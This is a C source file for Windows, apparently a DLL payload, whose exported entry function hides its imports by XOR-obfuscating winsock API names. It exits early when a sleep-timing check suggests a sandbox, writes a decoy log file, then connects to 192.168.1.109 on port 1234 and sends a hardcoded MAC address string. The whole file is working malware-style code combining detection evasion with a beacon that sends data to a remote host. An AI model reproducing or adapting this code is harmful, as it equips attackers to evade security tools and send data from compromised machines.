
#include <windows.h>

typedef int (WINAPI *LPWSAStartup)(WORD, LPWSADATA);
typedef SOCKET (WINAPI *LPSocket)(int, int, int);
typedef int (WINAPI *LPConnect)(SOCKET, const struct sockaddr*, int);
typedef int (WINAPI *LPSend)(SOCKET, const char*, int, int);
typedef int (WINAPI *LPCloseSocket)(SOCKET);
typedef int (WINAPI *LPWSACleanup)(void); typedef DWORD (WINAPI *LPInetAddr)(const char*);
typedef USHORT (WINAPI *LPHtons)(USHORT);



char env_lib[] = {'w' ^ 0xE2, 's' ^ 0xE2, '2' ^ 0xE2, '_', '3', '2', '.', 'd', 'l', 'l', '\0'};
char env_func0[] = {'W' ^ 0xE2, 'S' ^ 0xE2, 'A' ^ 0xE2, 'S' ^ 0xE2, 't' ^ 0xE2, 'a' ^ 0xE2, 'r' ^ 0xE2, 't' ^ 0xE2, 'u' ^ 0xE2, 'p' ^ 0xE2, '\0'};
char env_func1[] = {'s' ^ 0xE2, 'o' ^ 0xE2, 'c' ^ 0xE2, 'k' ^ 0xE2, 'e' ^ 0xE2, 't' ^ 0xE2, '\0'};
char env_func2[] = {'c' ^ 0xE2, 'o' ^ 0xE2, 'n' ^ 0xE2, 'n' ^ 0xE2, 'e' ^ 0xE2, 'c' ^ 0xE2, 't' ^ 0xE2, '\0'};
char env_func3[] = {'s' ^ 0xE2, 'e' ^ 0xE2, 'n' ^ 0xE2, 'd' ^ 0xE2, '\0'};
char env_func4[] = {'c' ^ 0xE2, 'l' ^ 0xE2, 'o' ^ 0xE2, 's' ^ 0xE2, 'e' ^ 0xE2, 's' ^ 0xE2, 'o' ^ 0xE2, 'c' ^ 0xE2, 'k' ^ 0xE2, 'e' ^ 0xE2, 't' ^ 0XE2, '\0'};
char env_func5[] = {'W' ^ 0xE2, 'S' ^ 0xE2, 'A' ^ 0xE2, 'C' ^ 0xE2, 'l' ^ 0xE2, 'e' ^ 0xE2, 'a' ^ 0xE2, 'n' ^ 0xE2, 'u' ^ 0xE2, 'p' ^ 0xE2, '\0'};
char env_func6[] = {'i' ^ 0xE2, 'n' ^ 0xE2, 'e' ^ 0xE2, 't' ^ 0xE2, '_' ^ 0xE2, 'a' ^ 0xE2, 'd' ^ 0xE2, 'd' ^ 0xE2, 'r' ^ 0xE2, '\0'};
char env_func7[] = {'h' ^ 0xE2, 't' ^ 0xE2, 'o' ^ 0xE2, 'n' ^ 0xE2, 's' ^ 0xE2, '\0'};



int xor_decrypt(char* data, size_t len, char key) {
	for (size_t i = 0; i < len; i++){
		data[i] ^= key;
	}
	return 0;
}


size_t my_strlen(const char* s){
	size_t i = 0;
	while(s[i]) ++i;
	return i;
}


__attribute__((visibility("default")))
__attribute__((used))
void entry(void) {


	DWORD start = GetTickCount();
	Sleep(1000);
	DWORD end = GetTickCount();
	if (end - start < 950) {
		ExitProcess(0);
	}
    

    xor_decrypt(env_lib, 3, 0xE2);
	HMODULE ws2_32 = LoadLibraryA(env_lib);


    xor_decrypt(env_func0, my_strlen(env_func0), 0xE2);
	LPWSAStartup pWSAStartup = (LPWSAStartup)GetProcAddress(ws2_32, env_func0);

    xor_decrypt(env_func1, my_strlen(env_func1), 0xE2);
	LPSocket pSocket = (LPSocket)GetProcAddress(ws2_32, env_func1);

    xor_decrypt(env_func2, my_strlen(env_func2), 0xE2);
	LPConnect pConnect = (LPConnect)GetProcAddress(ws2_32, env_func2);

    xor_decrypt(env_func3, my_strlen(env_func3), 0xE2);
	LPSend pSend = (LPSend)GetProcAddress(ws2_32, env_func3);

    xor_decrypt(env_func4, my_strlen(env_func4), 0xE2);
	LPCloseSocket pCloseSocket = (LPCloseSocket)GetProcAddress(ws2_32, env_func4);

    xor_decrypt(env_func5, my_strlen(env_func5), 0xE2);
	LPWSACleanup pWSACleanup = (LPWSACleanup)GetProcAddress(ws2_32, env_func5);

    xor_decrypt(env_func6, my_strlen(env_func6), 0xE2);
	LPInetAddr pInetAddr = (LPInetAddr)GetProcAddress(ws2_32, env_func6);

    xor_decrypt(env_func7, my_strlen(env_func7), 0xE2);
	LPHtons pHtons = (LPHtons)GetProcAddress(ws2_32, env_func7);



	HANDLE f = CreateFileA("C:\\Temp\\log.txt", GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (f != INVALID_HANDLE_VALUE) {
		DWORD written;
		WriteFile(f, "Init OK\n", 8, &written, 0);
		CloseHandle(f);
	}


	Sleep(500);

	

	WSADATA wsaData;
	SOCKET sock;
	struct sockaddr_in server;
	char* mac = "00-AA-BB-CC-DD-EE";

	// Init WinSock
	pWSAStartup(MAKEWORD(2,2), &wsaData);

	// Create socket
    sock = pSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	Sleep(500);

	server.sin_family = AF_INET;
	server.sin_port = pHtons(1234);
	server.sin_addr.s_addr = pInetAddr("192.168.1.109");

	pConnect(sock, (struct sockaddr*)&server, sizeof(server));
	pSend(sock, mac, my_strlen(mac), 0);

	pCloseSocket(sock);
	pWSACleanup();
}